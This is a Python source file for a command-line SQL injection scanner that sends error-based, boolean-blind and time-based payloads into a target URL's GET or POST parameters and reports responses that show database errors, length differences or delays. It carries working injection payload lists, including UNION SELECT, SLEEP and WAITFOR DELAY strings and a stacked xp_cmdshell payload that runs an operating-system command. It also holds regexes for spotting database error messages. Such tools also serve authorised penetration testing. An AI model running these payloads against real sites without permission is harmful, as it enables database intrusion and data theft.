#!/usr/bin/env python3
"""
SQL Injection Scanner
Detect SQL injection vulnerabilities with multiple techniques.

USAGE:
    python sqli_scanner.py <url> [-p param] [--method GET|POST] [--technique all|error|boolean|time]

EXAMPLES:
    python sqli_scanner.py "https://example.com/page?id=1"
    python sqli_scanner.py "https://example.com/page?id=1" -p id --technique error
    python sqli_scanner.py "https://example.com/login" --method POST -d "user=admin&pass=test" -p user
    python sqli_scanner.py "https://example.com/page?id=1" --level 3 --risk 2
"""

import sys
import argparse
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode
sys.path.insert(0, '/home/l0ve/Desktop/WD/Tools')
from lib import success, error, warning, info, banner, HTTPClient, normalize_url

# SQL Error patterns by database
SQL_ERRORS = {
    'MySQL': [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
    ],
    'PostgreSQL': [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
    ],
    'MSSQL': [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.",
        r"Exception.*\WRoadhouse\.Cms\.",
    ],
    'Oracle': [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
    ],
    'SQLite': [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
    ],
    'Generic': [
        r"SQL syntax",
        r"SQL error",
        r"syntax error",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
    ]
}

# Payloads by technique
PAYLOADS = {
    'error': [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "1' ORDER BY 1--+",
        "1' ORDER BY 100--+",
        "1' UNION SELECT NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ],
    'boolean': [
        "' AND '1'='1",
        "' AND '1'='2",
        "' OR '1'='1",
        "' OR '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "1 OR 1=1",
        "1 OR 1=2",
        "' AND 1=1--",
        "' AND 1=2--",
    ],
    'time': [
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "' AND pg_sleep(5)--",
        "' || pg_sleep(5)--",
    ],
    'stacked': [
        "'; SELECT SLEEP(5)--",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
        "'; DECLARE @x AS VARCHAR(100) SELECT @x=@@version--",
    ]
}


class SQLiScanner:
    def __init__(self, proxy: str = None, timeout: int = 10):
        self.client = HTTPClient(proxy=proxy, timeout=timeout)
        self.vulnerabilities = []
        self.baseline = None

    def get_baseline(self, url: str, method: str = 'GET', data: dict = None) -> dict:
        """Get baseline response."""
        try:
            if method == 'GET':
                resp = self.client.get(url)
            else:
                resp = self.client.post(url, data=data)

            self.baseline = {
                'status': resp.status_code,
                'length': len(resp.text),
                'content': resp.text,
                'time': resp.elapsed.total_seconds()
            }
            return self.baseline
        except Exception as e:
            error(f"Baseline failed: {e}")
            return None

    def detect_sql_errors(self, content: str) -> list:
        """Detect SQL error messages in response."""
        detected = []
        for db, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    detected.append(db)
                    break
        return list(set(detected))

    def test_error_based(self, url: str, param: str, method: str = 'GET', data: dict = None) -> list:
        """Test for error-based SQL injection."""
        findings = []

        for payload in PAYLOADS['error']:
            try:
                if method == 'GET':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    resp = self.client.get(test_url)
                else:
                    test_data = data.copy()
                    test_data[param] = payload
                    resp = self.client.post(url, data=test_data)

                errors = self.detect_sql_errors(resp.text)
                if errors:
                    findings.append({
                        'type': 'error-based',
                        'param': param,
                        'payload': payload,
                        'databases': errors,
                        'evidence': self._extract_evidence(resp.text)
                    })
                    success(f"[ERROR-BASED] param={param} | payload={payload} | db={errors}")

            except Exception as e:
                continue

        return findings

    def test_boolean_based(self, url: str, param: str, method: str = 'GET', data: dict = None) -> list:
        """Test for boolean-based blind SQL injection."""
        findings = []

        # Test true/false pairs
        pairs = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' OR '1'='1", "' OR '1'='2"),
        ]

        for true_payload, false_payload in pairs:
            try:
                if method == 'GET':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)

                    params[param] = [true_payload]
                    true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    true_resp = self.client.get(true_url)

                    params[param] = [false_payload]
                    false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    false_resp = self.client.get(false_url)
                else:
                    true_data = data.copy()
                    true_data[param] = true_payload
                    true_resp = self.client.post(url, data=true_data)

                    false_data = data.copy()
                    false_data[param] = false_payload
                    false_resp = self.client.post(url, data=false_data)

                # Check for significant difference
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                if len_diff > 50 or true_resp.status_code != false_resp.status_code:
                    findings.append({
                        'type': 'boolean-based',
                        'param': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'true_len': len(true_resp.text),
                        'false_len': len(false_resp.text),
                    })
                    success(f"[BOOLEAN-BASED] param={param} | true_len={len(true_resp.text)} | false_len={len(false_resp.text)}")

            except Exception as e:
                continue

        return findings

    def test_time_based(self, url: str, param: str, method: str = 'GET', data: dict = None, delay: int = 5) -> list:
        """Test for time-based blind SQL injection."""
        findings = []

        for payload in PAYLOADS['time']:
            try:
                start = time.time()

                if method == 'GET':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    resp = self.client.get(test_url)
                else:
                    test_data = data.copy()
                    test_data[param] = payload
                    resp = self.client.post(url, data=test_data)

                elapsed = time.time() - start

                if elapsed >= delay - 1:  # Allow 1 second tolerance
                    findings.append({
                        'type': 'time-based',
                        'param': param,
                        'payload': payload,
                        'delay': round(elapsed, 2),
                    })
                    success(f"[TIME-BASED] param={param} | payload={payload} | delay={elapsed:.2f}s")

            except Exception as e:
                continue

        return findings

    def _extract_evidence(self, content: str, max_len: int = 200) -> str:
        """Extract error message evidence."""
        for db, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    start = max(0, match.start() - 50)
                    end = min(len(content), match.end() + 100)
                    return content[start:end].strip()
        return None

    def scan(self, url: str, params: list = None, method: str = 'GET',
             data: dict = None, techniques: list = None) -> list:
        """Run full SQLi scan."""

        if not techniques:
            techniques = ['error', 'boolean', 'time']

        # Auto-detect parameters if not specified
        if not params:
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())

            if method == 'POST' and data:
                params.extend(data.keys())

        params = list(set(params))

        if not params:
            warning("No parameters to test")
            return []

        info(f"Testing {len(params)} parameter(s): {', '.join(params)}")
        info(f"Techniques: {', '.join(techniques)}")

        for param in params:
            info(f"\nTesting parameter: {param}")

            if 'error' in techniques:
                self.vulnerabilities.extend(self.test_error_based(url, param, method, data))

            if 'boolean' in techniques:
                self.vulnerabilities.extend(self.test_boolean_based(url, param, method, data))

            if 'time' in techniques:
                self.vulnerabilities.extend(self.test_time_based(url, param, method, data))

        return self.vulnerabilities


def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
    %(prog)s "https://example.com/page?id=1"
    %(prog)s "https://example.com/page?id=1" -p id --technique error
    %(prog)s "https://example.com/login" --method POST -d "user=admin&pass=test" -p user
        """
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-p', '--param', action='append', help='Parameter to test (can be repeated)')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method')
    parser.add_argument('-d', '--data', help='POST data (key=value&key2=value2)')
    parser.add_argument('--technique', choices=['all', 'error', 'boolean', 'time'], default='all', help='Injection technique')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('-o', '--output', help='Output file')
    args = parser.parse_args()

    banner("SQLi Scanner")
    info(f"Target: {args.url}")

    # Parse POST data
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                post_data[k] = v

    techniques = ['error', 'boolean', 'time'] if args.technique == 'all' else [args.technique]

    scanner = SQLiScanner(proxy=args.proxy, timeout=args.timeout)
    results = scanner.scan(
        args.url,
        params=args.param,
        method=args.method,
        data=post_data if post_data else None,
        techniques=techniques
    )

    print()
    if results:
        success(f"Found {len(results)} potential SQL injection(s)")
    else:
        warning("No SQL injection vulnerabilities detected")

    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump({'url': args.url, 'vulnerabilities': results}, f, indent=2)
        success(f"Results saved to {args.output}")


if __name__ == '__main__':
    main()
